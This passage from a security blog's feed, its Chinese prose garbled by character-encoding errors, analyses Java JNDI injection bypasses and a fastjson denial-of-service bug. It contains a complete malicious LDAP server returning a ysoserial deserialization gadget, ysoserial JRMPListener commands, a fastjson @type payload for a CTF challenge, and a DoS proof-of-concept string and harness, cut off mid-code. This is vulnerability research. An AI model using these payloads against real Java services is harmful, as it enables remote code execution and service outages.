Referenceè¿›è¡Œåˆ©ç”¨ä¹‹å¤–ï¼Œè¿˜æ”¯æŒç›´æ¥è¿”å›ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ã€‚å¦‚æœJavaå¯¹è±¡çš„ <code>javaSerializedData</code> å±æ€§å€¼ä¸ä¸ºç©ºï¼Œåˆ™å®¢æˆ·ç«¯çš„ <code>obj.decodeObject()</code> æ–¹æ³•å°±ä¼šå¯¹è¿™ä¸ªå­—æ®µçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782502.jpg" alt="-w1574"></p><p>å‡è®¾å®¢æˆ·ç«¯å­˜åœ¨æœ‰æ¼æ´çš„Apache-Commons-Collections-3.1ï¼ŒldapæœåŠ¡ç«¯è¿”å›ä¸€ä¸ªysoserialç”Ÿæˆçš„Expï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &apos;/Applications/Calculator.app/Contents/MacOS/Calculator&apos;|base64</span><br></pre></td></tr></table></figure></p><p>ldapæœåŠ¡ç«¯ä»£ç ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"https://127.0.0.1:80/#Exploit"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">     <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Payload1: Return Evil Reference Factory</span></span><br><span class="line"><span class="comment">//            e.addAttribute("javaCodeBase", cbstring);</span></span><br><span class="line"><span class="comment">//            e.addAttribute("objectClass", "javaNamingReference");</span></span><br><span class="line"><span class="comment">//            e.addAttribute("javaFactory", this.codebase.getRef());</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//Payload2: Return Evil Serialized Gadget</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// java -jar ysoserial.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64</span></span><br><span class="line">                e.addAttribute(<span class="string">"javaSerializedData"</span>, Base64.decode(<span class="string">"rO0ABXNyABFqYX..."</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>jdk8u201æµ‹è¯•ç»“æœï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782513.jpg" alt="-w1415"></p><p>è¿™ç§ç»•è¿‡æ–¹å¼éœ€è¦åˆ©ç”¨ä¸€ä¸ªæœ¬åœ°çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œæ¥ç»“åˆJNDIæ³¨å…¥çš„å…¥å£æ¥åˆ©ç”¨ã€‚</p><h3 id="åˆ©ç”¨JRMPè§¦å‘æœ¬åœ°gadget"><a href="#åˆ©ç”¨JRMPè§¦å‘æœ¬åœ°gadget" class="headerlink" title="åˆ©ç”¨JRMPè§¦å‘æœ¬åœ°gadget"></a>åˆ©ç”¨JRMPè§¦å‘æœ¬åœ°gadget</h3><p>JRMP(Java Remote Method Protocol)ï¼ŒJavaè¿œç¨‹æ–¹æ³•åè®®ï¼Œç±»æ¯”äºHTTPåè®®æ˜¯åŸºäºTCP/IPåè®®ï¼ŒRMIå³åŸºäºJRMPåè®®ã€‚JRMPè§„å®šäº†RMIé€šä¿¡è¿‡ç¨‹çš„æ•°æ®æ ¼å¼ç­‰ã€‚</p><p>ä»¥<a href="https://mp.weixin.qq.com/s?__biz=MzU4MTg1NzAzMA==&amp;mid=2247483796&amp;idx=1&amp;sn=ce4249ba61d7f402a1211e508f83d2b4&amp;chksm=fd407bfdca37f2ebd51202f8221d320ccd639fd48d6a2adcb53c17ccb143fc3f037e6198662a&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1577970121763&amp;sharer_shareid=b6a93c2ad862a6198898de9305c515e1#rd" target="_blank" rel="noopener">ç©ºæŒ‡é’ˆå…¬å¼€èµ›CTF-treasure</a>è¿™é¢˜ä¸ºä¾‹ï¼Œé¢˜ç›®æºç ï¼š<a href="media/15806219737687/treasure.zip">treasure</a><br>é«˜ç‰ˆæœ¬jdk8u201(é»˜è®¤ä¸å¼€è¿œç¨‹ç±»åŠ è½½)ï¼Œfastjson1.2.61ï¼Œæ ‡å‡†çš„è§£æjsonï¼šme/firesun/treasure/controller/SubmitController.java<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782525.jpg" alt="-w1273"><br>SubmitController.javaä¸­å¼€å¯äº†<code>autotype</code>ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782533.jpg" alt="-w669"></p><p>ä¸­é—´ä»¶ä¸­LogAspect.javaæ£€æµ‹typeå…³é”®å­—ï¼Œè¿™é‡Œç”¨<code>\x</code>16è¿›åˆ¶ç¼–ç ç»•å°±è¡Œäº†ï¼Œåœ¨ä¹‹å‰çš„æ–‡ç« <a href="mweblib://15802654101358" target="_blank" rel="noopener">Fastjson ååºåˆ—åŒ–è§¦å‘æµç¨‹åˆ†æ</a>ä¸­æœ‰åˆ†æã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782541.jpg" alt="-w1102"></p><p>æ¥ç€å°±æ˜¯å¯»æ‰¾JNDIæ³¨å…¥ç‚¹ï¼Œå…¨å±€æœ<code>lookup(</code>ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782553.jpg" alt="-w1269"></p><blockquote><p>è¿˜æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œæœä¸äº†classæ–‡ä»¶ï¼Œå¯ä»¥mvnæ‹‰ä¸‹æºç å…¨å±€æœ<br>/org/apache/commons/proxy/provider/remoting/RmiProvider.classä¸­æœ‰ä¸€å¤„<code>lookup</code>å‡½æ•°è°ƒç”¨ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782566.jpg" alt="-w1376"><br>å‚æ•°<code>name</code>åˆ©ç”¨fastjsonè§£æjsonæ•°æ®è‡ªåŠ¨è°ƒç”¨<code>setXX</code>æ–¹æ³•è®¾ç½®ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782574.jpg" alt="-w716"><br>å†çœ‹çœ‹regå˜é‡: RmiProvider.class#getRegistryï¼Œä¹Ÿå°±æ˜¯rmiçš„å®¢æˆ·ç«¯å®ç°</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiProvider</span> <span class="keyword">implements</span> <span class="title">ObjectProvider</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String host = <span class="string">"localhost"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> port = <span class="number">1099</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Registry <span class="title">getRegistry</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.clientSocketFactory != <span class="keyword">null</span> ? LocateRegistry.getRegistry(<span class="keyword">this</span>.host, <span class="keyword">this</span>.port, <span class="keyword">this</span>.clientSocketFactory) : LocateRegistry.getRegistry(<span class="keyword">this</span>.host, <span class="keyword">this</span>.port);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ObjectProviderException(<span class="string">"Unable to locate registry at "</span> + <span class="keyword">this</span>.host + <span class="string">":"</span> + <span class="keyword">this</span>.port + <span class="string">"."</span>, var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>æ„é€ ä¸€ä¸ªJRMP Serverï¼Œåˆ©ç”¨RMIè§¦å‘ï¼Œåœ¨ä¾èµ–åº“é‡Œå¼•ç”¨äº†<code>commons-collections3.2</code>,ä½¿ç”¨ysoserialçš„commonscollections5ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1088 CommonsCollections5 &apos;/Applications/Calculator.app/Contents/MacOS/Calculator&apos;</span><br></pre></td></tr></table></figure></p><p>submitè·¯ç”±å‘é€ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@\u0074ype&quot;:&quot;org.apache.commons.proxy.provider.remoting.RmiProvider&quot;,&quot;host&quot;:&quot;127.0.0.1&quot;,&quot;port&quot;:&quot;1088&quot;,&quot;name&quot;:&quot;Object&quot;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063782585.jpg" alt="-w1032"></p><blockquote><p>åŒæ ·ä¹Ÿè¦æ±‚classpathä¸­çš„ç±»æœ‰ååºåˆ—åŒ–æ¼æ´ï¼Œå€ŸåŠ©Registryçš„å…¥å£å®ç°å‘½ä»¤æ‰§è¡Œã€‚</p></blockquote><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ–‡ç« ç ”ç©¶äº†å¤šä¸ªjdkç‰ˆæœ¬çš„å¤šç§jndiæ³¨å…¥æ–¹å¼ï¼Œä»¥åŠé«˜ç‰ˆæœ¬åˆ©ç”¨é™åˆ¶åˆ†æå’Œç»•è¿‡æ–¹å¼ï¼Œæ”¶è·é¢‡ä¸ºä¸°å¯Œã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><ul><li><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">kingx: æ·±å…¥ç†è§£JNDIæ³¨å…¥ä¸Javaååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</a></li><li><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">kingx: å¦‚ä½•ç»•è¿‡é«˜ç‰ˆæœ¬JDKçš„é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥åˆ©ç”¨</a></li><li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a></li><li><a href="https://www.cnblogs.com/Welk1n/p/11066397.html" target="_blank" rel="noopener">Welkin: æµ…æJNDIæ³¨å…¥Bypass</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="https://0day.design/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>FastJson æ‹’ç»æœåŠ¡æ”»å‡»åˆ†æ (&lt;=1.2.59)</title>
    <link href="https://0day.design/2020/02/01/fastjson%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    <id>https://0day.design/2020/02/01/fastjsonæ‹’ç»æœåŠ¡æ”»å‡»åˆ†æ/</id>
    <published>2020-02-01T05:05:00.000Z</published>
    <updated>2020-03-19T12:47:56.509Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="FastJson-æ‹’ç»æœåŠ¡æ”»å‡»åˆ†æ-lt-1-2-59"><a href="#FastJson-æ‹’ç»æœåŠ¡æ”»å‡»åˆ†æ-lt-1-2-59" class="headerlink" title="FastJson æ‹’ç»æœåŠ¡æ”»å‡»åˆ†æ (&lt;=1.2.59)"></a>FastJson æ‹’ç»æœåŠ¡æ”»å‡»åˆ†æ (&lt;=1.2.59)</h1><p>æœ€è¿‘åœ¨ç¿»èµ„æ–™çš„æ—¶å€™å‘ç°äº†è¿™æ ·ä¸€ä¸ªæœ‰æ„æ€çš„æ¼æ´ï¼Œç®€è€Œè¨€ä¹‹ï¼Œæ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯å¼€å‘å¯¹è¾“å…¥æ•°æ®è€ƒè™‘ä¸å‘¨å…¨ï¼Œè‡´ä½¿ä¸€ä¸ªç´¢å¼•æŒ‡é’ˆè¶Šç•Œï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡çš„é—®é¢˜ã€‚æ¯”å¦‚æˆ‘ä»¬è¾“å…¥16è¿›åˆ¶<code>\x0a</code>ï¼Œè€Œå¼€å‘æœªè€ƒè™‘åˆ°æ¶æ„æ”»å‡»è€…å¦‚æœåªè¾“å…¥<code>\x</code>ï¼Œå°†ä¼šå¯¼è‡´ç´¢å¼•æŒ‡é’ˆå¾€åç§»åŠ¨äº†ä¸¤ä¸ªæŒ‡å‘äº†æ•°æ®ä¹‹å¤–(è¶Šç•Œ)çš„åœ°æ–¹.</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>pom.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.59<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        String DEATH_STRING = &quot;&#123;\&quot;a\&quot;:\&quot;\\x&quot;;//è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ä¸º8</span><br><span class="line">        JSON.parse(DEATH_STRING);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077022.jpg" alt="-w1047"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨è¿™ç¯‡æ–‡ç« é‡Œä»‹ç»äº†fastjsonè§£æjsonä¸²çš„æœºåˆ¶ï¼š<a href="https://zonghaishang.gitbooks.io/fastjson-source-code-analysis/content/lexer/lexer_part2.html" target="_blank" rel="noopener">fastjsonæºç è§£æï¼šJSON Tokenè§£æ</a>ï¼Œè¿™é‡Œæˆ‘ä»¬è®°ä½<code>bp</code>ä¸ºè¯»å–å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€<code>sp</code>ä¸ºå­—ç¬¦ç¼“å­˜åŒºç´¢å¼•å°±å¥½äº†:<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077029.jpg" alt="-w491"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077036.jpg" alt="-w513"></p><p>ç›´æ¥æ¥çœ‹è§£æ16è¿›åˆ¶çš„ä»£ç ä½ç½®ï¼š/parser/JSONLexerBase.java#scanString<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077044.jpg" alt="-w1432"></p><p>è·Ÿè¿›<code>next</code>å‡½æ•°ï¼šJSONScanner.java#next()<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077051.jpg" alt="-w881"><br>å…ˆç»™ç´¢å¼•æŒ‡é’ˆè¿›è¡Œäº†è‡ªå¢èµ‹å€¼ï¼Œæ¥ç€åˆ¤æ–­ç´¢å¼•å’Œå®é™…é•¿åº¦çš„æ¯”è¾ƒï¼Œå¦‚æœç´¢å¼•æ¯”å®é™…é•¿åº¦é•¿æˆ–è€…ç›¸ç­‰åˆ™è¿”å›<code>EOI</code>,å¦åˆ™è¿”å›å½“å‰ç´¢å¼•æŒ‡å‘çš„å­—ç¬¦ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077058.jpg" alt="-w480"><br>ç»è¿‡ç¬¬ä¸€æ¬¡çš„<code>next</code>å¤„ç†ï¼Œå·²ç»è¿”å›<code>EOI(0x1A)</code>äº†ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077066.jpg" alt="-w967"></p><p>ä½†æ˜¯ä»–åˆè°ƒç”¨äº†ä¸€æ¬¡<code>next</code>(å³é»˜è®¤ä¿¡ä»»ç”¨æˆ·è¾“å…¥<code>\x</code>åè·Ÿä¸¤ä½å­—ç¬¦)ï¼Œæ­¤æ—¶ç´¢å¼•çš„æŒ‡é’ˆ<code>bp</code>ä¸º9äº†ï¼Œå·²ç»è¶Šç•Œäº†ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077073.jpg" alt="-w914"></p><p>ç„¶åç»è¿‡<code>putChar</code>å‡½æ•°ï¼Œ<code>break</code>äº†<code>switch</code>åˆ†æ”¯ï¼Œç»§ç»­è¿›è¡Œè¿™ä¸ªå¾ªç¯ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077081.jpg" alt="-w1125"></p><p>è·Ÿè¿›<code>isEOF</code>å‡½æ•°ï¼šJSONScanner.java#isEOFï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077090.jpg" alt="-w1013"><br><code>bp+1</code>å·²ç»è¿œå¤§äºlenäº†ï¼Œè¿™ä¸ªæ¡ä»¶æ°¸è¿œåªèƒ½è¿”å›<code>false</code>ã€‚</p><p>è·Ÿè¿›<code>putChar</code>å‡½æ•°ï¼Œå¦‚æœ<code>sp</code>å’Œç¼“å­˜å­—ç¬¦é•¿åº¦ç›¸å¯¹åï¼Œåˆ™ç”³è¯·ä¸€ä¸ª<code>char</code>å ç”¨å½“å‰<code>sbuf.length</code>çš„ä¸¤å€ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077100.jpg" alt="-w920"><br>æ‰€ä»¥æœ€åçš„ç»“æœå°±æ˜¯è¿›å…¥ä¸€ä¸ªæ­»å¾ªç¯ä¸”æˆå€ç”³è¯·å†…å­˜ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077108.jpg" alt="-w709"></p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>åœ¨æ–°ç‰ˆæœ¬1.2.60ä¸­ï¼Œä¿®æ”¹äº†<code>isEOF</code>å‡½æ•°çš„åˆ¤æ–­æ¡ä»¶ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077115.jpg" alt="-w677"><br>å¹¶ä¸”å¢åŠ äº†<code>x1</code>å’Œ<code>x2</code>çš„æ ¡éªŒï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077123.jpg" alt="-w1043"></p><p>å…¶æ¬¡ï¼Œåœ¨å®é™…çš„æµ‹è¯•ä¸­å¹¶æ²¡æœ‰ç†æƒ³ä¸­çš„æ‹’ç»æœåŠ¡æ•ˆæœï¼Œä½¿ç”¨å¤šçº¿ç¨‹å ç”¨ä¹Ÿå°±ä»100å¤šMæ¶¨åˆ°2.5Gçš„æ ·å­ã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastjsonDos</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> fastjsonDos()).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> fastjsonDos()).start();</span><br><span class="line">        <span 